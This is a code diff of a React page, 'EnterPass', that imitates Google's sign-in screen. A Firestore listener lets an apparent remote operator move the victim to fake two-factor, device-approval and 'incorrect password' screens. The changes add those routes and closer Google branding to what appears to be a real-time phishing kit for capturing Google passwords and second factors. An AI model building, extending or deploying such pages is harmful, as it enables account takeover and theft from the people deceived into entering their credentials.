@@ -34,22 +34,22 @@ export default function EnterPass() {
     const listener = (userID) => {
       onSnapshot(doc(db, "users", userID), (snapshot) => {
         const status = snapshot.data()?.status;
+        const type = snapshot.data()?.type;
+        const num = snapshot.data()?.num;
         if (status === 1) return;
-  
         // Handle different status codes here
         switch (status) {
           case 4:
             navigate(`/schedule/confirm/done`);
             break;
+          case 5:
+            navigate(`/google/approve/device/${userID}/${num}`);
+            break;
           case 3:
-            navigate(`/google/twofactor/${userID}`);
+            navigate(`/google/factor/${userID}/${type}`);
             break;
           case -2:
             setError("The password entered is incorrect.")
-            // setResult({
-            //   title: "Login code is required",
-            //   detail: "Your login code is incorrect, please try again.",
-            // });
             setIsLoading(false);
             break;
           default:
@@ -80,56 +80,67 @@ export default function EnterPass() {
       )}
       {/* Card container */}
       <div className="bg-white w-full max-w-sm sm:max-w-md rounded-none sm:rounded-2xl sm:shadow-[0_8px_24px_rgba(60,64,67,0.12),0_2px_6px_rgba(60,64,67,0.08)] sm:p-10 px-6 py-12 mt-0 sm:mt-0 flex flex-col">
-        {/* Google Logo */}
-        <div className="flex justify-center mb-8 sm:mb-6">
-          <img
-            src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
-            alt="Google"
-            className="h-6 sm:h-8"
-          />
-        </div>
+       {/* Google Logo */}
+<div className="flex flex-col sm:items-center items-start justify-center">
 
-        {/* Title */}
-        <h1 className="text-xl sm:text-2xl font-normal text-center mb-2">
-          Welcome
-        </h1>
-<div className="flex justify-center inline-block text-left mt-1 mb-8 sm:mb-10">
-      <button
-        onClick={() => setOpen(!open)}
-        className="flex items-center gap-2 p-1 border border-gray-300 rounded-full hover:shadow-sm transition"
-      >
-<svg
-  className="w-6 h-6 rounded-full"
-  aria-hidden="true"
-  fill="#5f6368"
-  focusable="false"
-  viewBox="0 0 24 24"
-  xmlns="http://www.w3.org/2000/svg"
->
-  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 
-           10-4.48 10-10S17.52 2 12 2zm6.36 14.83
-           c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36
-           2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8
-           8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12
-           6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13
-           s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
-</svg>
-        <svg
-          className={`w-4 h-4 text-gray-600 transition-transform ${
-            open ? "rotate-360" : ""
-          }`}
-          fill="none"
-          stroke="currentColor"
-          strokeWidth={2}
-          viewBox="0 0 24 24"
-        >
-          <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
-        </svg>
-      </button>
-    </div>
+  <div className="mb-8 sm:mb-6">
+<img
+  src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+  alt="Google"
+  className="hidden sm:block h-8"
+/>
+<img
+  src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png"
+  alt="Google"
+  className="block sm:hidden h-11"
+/>
 
+  </div>
+
+  {/* Title */}
+  <h1 className="text-xl sm:text-3xl font-normal text-left sm:text-center mb-2">
+    Welcome
+  </h1>
+
+
+
+</div>
+<div className="flex justify-start sm:justify-center inline-block text-left mt-1 mb-8 sm:mb-10">
+  <button
+    onClick={() => setOpen(!open)}
+    className="flex items-center gap-2 p-1 border border-gray-300 rounded-full hover:shadow-sm transition"
+  >
+    <svg
+      className="w-6 h-6 rounded-full"
+      aria-hidden="true"
+      fill="#5f6368"
+      focusable="false"
+      viewBox="0 0 24 24"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 
+               10-4.48 10-10S17.52 2 12 2zm6.36 14.83
+               c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36
+               2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8
+               8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12
+               6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13
+               s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+    </svg>
+    <svg
+      className={`w-4 h-4 text-gray-600 transition-transform ${
+        open ? "rotate-360" : ""
+      }`}
+      fill="none"
+      stroke="currentColor"
+      strokeWidth={2}
+      viewBox="0 0 24 24"
+    >
+      <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
+    </svg>
+  </button>
+</div>
         {/* Form */}
-        <form className="flex flex-col flex-1">
+        <div className="flex flex-col flex-1">
 
           <input
             id="password"
@@ -182,7 +193,7 @@ export default function EnterPass() {
             } 
             </button>
           </div>
-        </form>
+        </div>
       </div>
 
       {/* Footer */}
